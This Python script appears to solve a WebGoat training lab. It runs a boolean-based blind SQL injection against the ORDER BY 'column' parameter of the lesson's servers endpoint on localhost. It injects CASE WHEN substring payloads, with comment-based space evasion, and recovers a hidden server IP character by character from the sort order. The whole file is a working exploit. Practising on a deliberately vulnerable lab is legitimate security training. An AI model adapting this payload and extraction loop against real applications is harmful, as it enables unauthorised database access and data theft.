#!/usr/bin/env python3
import requests
import re

# ─── HELPERS ────────────────────────────────────────────────────────────────

def page_sorts_by_hostname(response_text: str) -> bool:
    """
    Checks if the response is sorted by hostname instead of IP.
    If it's 'webgoat-acc' first, that means our CASE ... THEN hostname branch
    was taken → guess was TRUE.  Otherwise it sorted by IP → FALSE.
    """
    # Debug: print the response to see what we're getting
    print(f"DEBUG: Response length: {len(response_text)}")
    print(f"DEBUG: First 500 chars:\n{response_text[:500]}")
    
    try:
        import json
        # Parse JSON response
        servers = json.loads(response_text)
        if not servers or len(servers) == 0:
            raise RuntimeError("Empty server list in JSON response")
        
        # Check the first server's hostname
        first_hostname = servers[0].get("hostname", "")
        print(f"DEBUG: First server hostname: {first_hostname}")
        
        # If webgoat-acc is first, our condition was true (sorted by hostname)
        # If webgoat-tst is first, our condition was false (sorted by IP)
        return first_hostname == "webgoat-acc"
        
    except json.JSONDecodeError:
        print("DEBUG: Response is not JSON, trying HTML parsing...")
        # Fall back to HTML parsing if JSON fails
        tb = re.search(r"<tbody>(.*?)</tbody>", response_text, re.S)
        if not tb:
            # Try to find any table-related content
            if "<table" in response_text.lower():
                print("DEBUG: Found <table> but no <tbody>")
            if "<tr" in response_text.lower():
                print("DEBUG: Found <tr> elements")
            raise RuntimeError("No <tbody> in response")
        
        # first row
        row = re.search(r"<tr[^>]*>(.*?)</tr>", tb.group(1), re.S)
        if not row:
            raise RuntimeError("No <tr> in tbody")
        # first cell
        cell = re.search(r"<td[^>]*>([^<]+)</td>", row.group(1))
        if not cell:
            raise RuntimeError("No <td> in first row")
        first = cell.group(1).strip()
        return first == "webgoat-acc"

# ─── CONFIG ────────────────────────────────────────────────────────────────

BASE_URL = "http://localhost:8080/WebGoat/SqlInjectionMitigations/servers"
from cookie import COOKIE  # noqa: E402
CHARSET  = "0123456789."   # digits + dot
MAX_POS  = 20             # generous maximum for any IP length

def test_ip_char(pos: int, ch: str) -> bool:
    """
    Injects a CASE WHEN into ORDER BY that checks:
       substring((SELECT ip ...), pos, 1) = ch
    If true → ORDER BY hostname  (and first cell is webgoat-acc)
    Else   → ORDER BY ip        (first cell is webgoat-tst)
    """
    inj = (
        "CASE/**/WHEN/**/"
        f"substring((SELECT/**/ip/**/FROM/**/servers"
        f"/**/WHERE/**/hostname='webgoat-prd'),{pos},1)='{ch}'"
        "/**/THEN/**/hostname/**/ELSE/**/ip/**/END"
    )
    
    print(f"DEBUG: Testing pos={pos}, ch='{ch}'")
    print(f"DEBUG: Injection payload: {inj}")
    
    try:
        r = requests.get(
            BASE_URL,
            params={"column": inj, "direction": "asc"},
            cookies=COOKIE,
            timeout=10
        )
        print(f"DEBUG: HTTP Status: {r.status_code}")
        r.raise_for_status()
        return page_sorts_by_hostname(r.text)
    except requests.exceptions.RequestException as e:
        print(f"DEBUG: Request failed: {e}")
        raise

# ─── MAIN EXTRACTION ───────────────────────────────────────────────────────

def extract_full_ip():
    """
    Extracts the complete IP address by testing each character position.
    Stops when no character matches at a position (indicating end of IP).
    """
    ip_address = ""
    dot_count = 0
    
    print("[*] Starting full IP extraction...")
    print("[*] Will stop when no character matches (indicating end of IP)")
    
    for pos in range(1, MAX_POS + 1):
        found_char = False
        
        print(f"\n[*] Testing position {pos}...")
        
        for ch in CHARSET:
            if test_ip_char(pos, ch):
                print(f"[+] Position {pos}: '{ch}'")
                ip_address += ch
                found_char = True
                
                # Count dots to track progress
                if ch == ".":
                    dot_count += 1
                    print(f"[+] Found dot #{dot_count} - Progress: {ip_address}")
                
                break
        
        # If no character matched at this position, IP is complete
        if not found_char:
            print(f"[+] No match at position {pos} - IP extraction complete!")
            break
    
    return validate_and_return_ip(ip_address, dot_count)

def validate_and_return_ip(ip_address: str, dot_count: int):
    """
    Validates and returns the extracted IP address
    """
    if ip_address and dot_count == 3:
        # Check if IP looks valid (basic validation)
        parts = ip_address.split('.')
        if len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts):
            print(f"\n✅ Successfully extracted complete IP: {ip_address}")
            print("[+] IP validation: ✅ Valid format")
            return ip_address
        else:
            print(f"\n⚠️  Extracted IP may be incomplete: {ip_address}")
            print(f"[+] Parts found: {parts}")
            return ip_address
    elif ip_address:
        print(f"\n⚠️  Partial IP extracted: {ip_address}")
        print(f"[+] Dots found: {dot_count}/3")
        return ip_address
    else:
        print("\n❌ Failed to extract any IP data")
        return None

def validate_ip_format(ip: str) -> bool:
    """
    Basic IP format validation
    """
    if not ip:
        return False
    
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    
    for part in parts:
        if not part.isdigit():
            return False
        num = int(part)
        if num < 0 or num > 255:
            return False
    
    return True

if __name__ == "__main__":
    print("=" * 60)
    print("FULL IP ADDRESS EXTRACTION")
    print("=" * 60)
    
    extracted_ip = extract_full_ip()
    
    if extracted_ip:
        print("\n" + "=" * 60)
        print(f"FINAL RESULT: {extracted_ip}")
        
        if validate_ip_format(extracted_ip):
            print("STATUS: ✅ Valid IP format")
        else:
            print("STATUS: ⚠️  Invalid or incomplete IP format")
        print("=" * 60)
    else:
        print("\n" + "=" * 60)
        print("FINAL RESULT: ❌ Extraction failed")
        print("=" * 60)
